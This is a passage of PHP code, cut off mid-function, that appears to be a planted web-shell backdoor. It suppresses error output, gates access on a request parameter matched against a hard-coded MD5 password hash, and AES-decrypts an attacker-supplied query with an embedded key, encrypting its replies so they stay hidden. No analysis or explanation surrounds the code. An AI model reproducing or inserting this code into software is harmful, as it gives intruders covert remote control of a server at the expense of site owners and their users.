...
/*xosnykny_4l0y9p_4g8*/
if( isset( $_REQUEST['ithei'] ) ) {
    @ini_set('error_reporting', 0);
    @ini_set('display_errors', 0);
    @ini_set('display_startup_errors', 0);
    function query_ex() {
        define('BORDERS', 'h10yt5ymixojd4jf');
        function _out( $data, $key = 'KVhmXBMppNtIxumHGL80PfIAeByUNpjZ3KwtauZzgcQ=' ) {
            $data = @openssl_encrypt($data, "AES-256-CBC", base64_decode($key), 0, substr(base64_decode($key), 0, 16));
            return BORDERS . $data . BORDERS;
        }
        if (md5(base64_decode($_REQUEST['ithei'])) !== 'f736a18ba710934493e7f425665c16ab')
            exit(_out("BAD_PAS"));
        $key = 'KVhmXBMppNtIxumHGL80PfIAeByUNpjZ3KwtauZzgcQ=';
        if (!isset($_REQUEST['oanv']))
            exit(_out("BAD_QUERY"));
        $query = @openssl_decrypt($_REQUEST['oanv'], "AES-256-CBC", base64_decode($key), 0, substr(base64_decode($key), 0, 16));
